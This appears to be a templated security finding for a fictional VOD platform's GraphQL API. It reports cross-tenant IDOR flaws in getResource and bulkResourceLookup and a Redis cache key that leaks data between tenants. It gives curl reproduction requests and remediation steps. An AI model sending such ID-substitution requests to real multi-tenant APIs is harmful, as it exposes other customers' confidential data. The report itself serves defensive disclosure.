## System

- System: StreamCore VOD Platform v4.4.1
- Domain: MEDIA / CONTENT DELIVERY
- Example ID: GQL-0419
- Risk ID: RISK-GQL-419

## Findings

### 1. Pattern 1.1 — ID Without Ownership Check: `getResource` (HAR Primary)

**HAR evidence**: JWT `x-tenant-id: tenant-02b9`. Request: `getResource(id: "R-2419")`. Response: HTTP 200 with `tenantId: "tenant-dd65"`, `ownerId: "other-user-02b9dd65"`, `sensitiveField: "CONFIDENTIAL-02b9dd65"`, `internalNotes: "Internal data exposed"`.

**Pattern 1.1 (ID in Path Without Ownership Check)**: Section 4.0 (RISK-GQL-419): "`getResource` resolver fetches by `resourceId` only. The resolver does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId`." For a VOD platform, resources represent video content metadata, DRM keys, licensing agreements, or content rights data. Cross-tenant read exposes competitor's proprietary content catalogue data, DRM configurations, and internal content delivery notes.

### 2. Bulk Cross-Tenant Content Enumeration — `bulkResourceLookup`

Section 4.0: "bulkResourceLookup mutation accepts an arbitrary array of IDs without per-ID ownership filtering." Enables mass content intelligence exfiltration across tenant boundaries.

```bash
curl -s -X POST https://api.streamcore-vod-platf.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-02B9>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-02b9" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2419\", \"R-3419\", \"R-4419\"]) { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```

Vulnerable: Returns VOD content records from `tenant-dd65` and other tenants.

### 3. Redis Cache Content Leak

Section 2.0: "Redis cache keyed by `resourceId` (NOTE: no user dimension in cache key)." Any `tenant-02b9` user requesting `R-2419` after `tenant-dd65` first populated the cache receives competitor's VOD content data directly from cache — content rights violation.

```bash
curl -s -X POST https://api.streamcore-vod-platf.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-02B9>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-02b9" \
  -d '{"query": "query { getResource(id: \"R-2419\") { resourceId tenantId data { sensitiveField } } }"}'
```

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s -X POST https://api.streamcore-vod-platf.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-02B9>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-02b9" \
  -d '{"query": "query { getResource(id: \"R-1419\") { resourceId tenantId ownerId data { sensitiveField } } }"}'
```

Expected: `tenantId: "tenant-02b9"` — own VOD content record.

**Step 2 — Cross-tenant ID substitution (primary HAR attack):**

```bash
curl -s -X POST https://api.streamcore-vod-platf.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-02B9>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-02b9" \
  -d '{"query": "query { getResource(id: \"R-2419\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```

Expected secure: `{"errors": [{"message": "Forbidden"}], "data": {"getResource": null}}`.  
Expected vulnerable: `tenantId: "tenant-dd65"`, `sensitiveField`, `internalNotes`.

## Evidence

- **HAR**: `getResource(id: "R-2419")` with `tenant-02b9` JWT → HTTP 200 → `tenantId: "tenant-dd65"`, `sensitiveField`, `internalNotes`.
- **Section 4.0 (RISK-GQL-419)**: `getResource` resolver lacks tenant check.
- **Section 4.0**: `bulkResourceLookup` has no per-ID ownership filtering.
- **Section 2.0**: Redis cache keyed by `resourceId` only — no user/tenant dimension.

## Remediation

- **Resolver-level tenant check**: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` (RISK-GQL-419, pending remediation).
- **Per-ID ownership filter in `bulkResourceLookup`**: post-fetch filter returning only `tenantId === jwtTenantId` items.
- **Fix Redis cache key**: include `tenantId` and `userId` (e.g., `resource:{tenantId}:{resourceId}`).
- **Regression test**: Tenant A token requests Tenant B `resourceId` — assert 403/null.
